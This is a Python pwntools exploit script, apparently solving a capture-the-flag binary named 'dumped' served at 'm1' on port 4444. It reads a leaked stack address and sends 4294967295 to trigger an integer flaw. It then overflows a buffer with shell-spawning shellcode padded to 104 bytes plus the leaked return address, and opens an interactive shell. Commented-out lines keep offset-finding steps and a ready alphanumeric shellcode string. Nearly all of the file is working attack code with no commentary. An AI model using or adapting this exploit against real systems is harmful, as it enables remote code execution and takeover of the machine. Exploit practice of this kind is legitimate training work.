from pwn import *

context.binary = binary = './dumped'

vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)
# libc = ELF(vuln_elf.runpath+b'/libc.so.6')

gs = '''
b *start
c 
'''


def start():
    if args.GDB:
        return gdb.debug(vuln_elf.path, gdbscript=gs)
    else:
        return process(vuln_elf.path)


#p = start()
p = remote('m1', 4444)
p.recvuntil(b"number: ")

leak = p.recvuntil(b"\n").strip()
leak = int(leak, 16)
log.info(f"{hex(leak)=}")

p.sendafter(b'throwing: ', b'4294967295\n')



# p.sendafter(b'trash: ', cyclic(150))
# time.sleep(1)
# core = Coredump(f'./core.{p.pid}')
# seg_addr = hex(core.fault_addr)
# log.success(f"Core fault address at: {core.fault_addr}")
# log.info(f"finding offset for: {seg_addr}")
# offset = cyclic_find(int(seg_addr, 16))
# log.success(f"Offset found at: {offset}")
# p.close()

# print(vuln_rop.find_gadget(['jmp rsp']))

# Working
# payload = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
payload = asm(f"""
    {shellcraft.sh()}

""")

payload += b'A' * (104 - len(payload))
payload += p64(leak)
print(payload, len(payload))
p.sendafter(b'trash: ', payload)

p.interactive()
